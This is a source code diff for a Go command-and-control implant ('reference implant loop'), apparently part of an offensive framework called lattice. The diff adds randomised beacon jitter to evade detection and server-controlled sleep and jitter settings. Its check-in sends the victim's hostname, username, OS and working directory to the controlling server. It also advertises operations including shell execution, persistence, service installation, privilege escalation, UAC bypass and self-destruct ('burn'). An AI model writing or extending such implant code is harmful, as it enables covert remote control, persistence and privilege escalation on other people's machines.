@@ -3,6 +3,7 @@ package runtime
 import (
 	"context"
 	"log/slog"
+	"math/rand/v2"
 	"os"
 	"os/user"
 	"runtime"
@@ -15,16 +16,33 @@ import (
 	"github.com/digitizables/lattice/internal/version"
 )
 
+// Capability / op advertisement for check-in (matches implemented builtins).
+var (
+	agentFeatures = []string{
+		"shell", "ps", "fs", "download", "upload",
+		"persist", "cleanup", "update", "elevate",
+	}
+	agentOps = []string{
+		"whoami", "echo", "hostname", "pwd", "cd", "cwd",
+		"shell", "run", "cmd", "powershell", "pwsh", "bash", "sh",
+		"ps", "ls", "cat", "download", "upload",
+		"persist", "install-service", "cleanup", "uninstall-all", "burn",
+		"update", "elevate", "privesc", "uac",
+	}
+)
+
 // Agent is the reference implant loop.
 type Agent struct {
-	ID           string
-	Cwd          string // host working directory for shell commands
-	Sleep        time.Duration
-	Transport    *transport.HTTP
-	Log          *slog.Logger
-	IDFile       string // when set, persist server-assigned id across restarts
-	ServerURL    string
-	InsecureTLS  bool
+	ID            string
+	Cwd           string // host working directory for shell commands
+	Sleep         time.Duration
+	Token         string // shared agent token (also on Transport)
+	JitterPercent uint32 // 0-100; sleep *= (1 ± jitter%)
+	Transport     *transport.HTTP
+	Log           *slog.Logger
+	IDFile        string // when set, persist server-assigned id across restarts
+	ServerURL     string
+	InsecureTLS   bool
 	exitAfterTask bool
 }
 
@@ -35,6 +53,9 @@ func (a *Agent) Run(ctx context.Context) error {
 	}
 	if a.Sleep <= 0 {
 		a.Sleep = 5 * time.Second
+	}
+	if a.JitterPercent > 100 {
+		a.JitterPercent = 100
 	}
 	a.ensureCwd()
 	a.Log.Info("working directory", "cwd", a.Cwd)
@@ -47,9 +68,31 @@ func (a *Agent) Run(ctx context.Context) error {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
-		case <-time.After(a.Sleep):
+		case <-time.After(a.sleepWithJitter()):
 		}
 	}
+}
+
+// sleepWithJitter returns Sleep * (1 + random±JitterPercent%).
+func (a *Agent) sleepWithJitter() time.Duration {
+	base := a.Sleep
+	if base <= 0 {
+		base = 5 * time.Second
+	}
+	j := a.JitterPercent
+	if j == 0 {
+		return base
+	}
+	if j > 100 {
+		j = 100
+	}
+	// Uniform integer offset in [-j, +j].
+	delta := int32(rand.IntN(int(2*j+1))) - int32(j)
+	d := time.Duration(float64(base) * (1 + float64(delta)/100))
+	if d < 0 {
+		return 0
+	}
+	return d
 }
 
 func (a *Agent) beat(ctx context.Context) error {
@@ -61,14 +104,18 @@ func (a *Agent) beat(ctx context.Context) error {
 
 	a.ensureCwd()
 	resp, err := a.Transport.CheckIn(ctx, &agentv1.AgentCheckIn{
-		AgentId:      a.ID,
-		Hostname:     hostname,
-		Username:     username,
-		Os:           runtime.GOOS,
-		Arch:         runtime.GOARCH,
-		SleepSeconds: uint64(a.Sleep / time.Second),
-		Cwd:          a.Cwd,
-		Version:      version.Version,
+		AgentId:       a.ID,
+		Hostname:      hostname,
+		Username:      username,
+		Os:            runtime.GOOS,
+		Arch:          runtime.GOARCH,
+		SleepSeconds:  uint64(a.Sleep / time.Second),
+		Cwd:           a.Cwd,
+		Version:       version.Version,
+		AgentToken:    a.Token,
+		Features:      append([]string(nil), agentFeatures...),
+		Ops:           append([]string(nil), agentOps...),
+		JitterPercent: a.JitterPercent,
 	})
 	if err != nil {
 		return err
@@ -86,6 +133,18 @@ func (a *Agent) beat(ctx context.Context) error {
 				a.Log.Info("persisted agent id", "path", a.IDFile, "agent_id", a.ID)
 			}
 		}
+	}
+	if s := resp.GetSleepSeconds(); s > 0 {
+		a.Sleep = time.Duration(s) * time.Second
+		a.Log.Info("sleep updated from server", "sleep_seconds", s)
+	}
+	if resp.JitterPercent != nil {
+		jp := *resp.JitterPercent
+		if jp > 100 {
+			jp = 100
+		}
+		a.JitterPercent = jp
+		a.Log.Info("jitter updated from server", "jitter_percent", jp)
 	}
 	a.Log.Info("check-in ok", "agent_id", a.ID, "tasks", len(resp.GetTasks()))
 
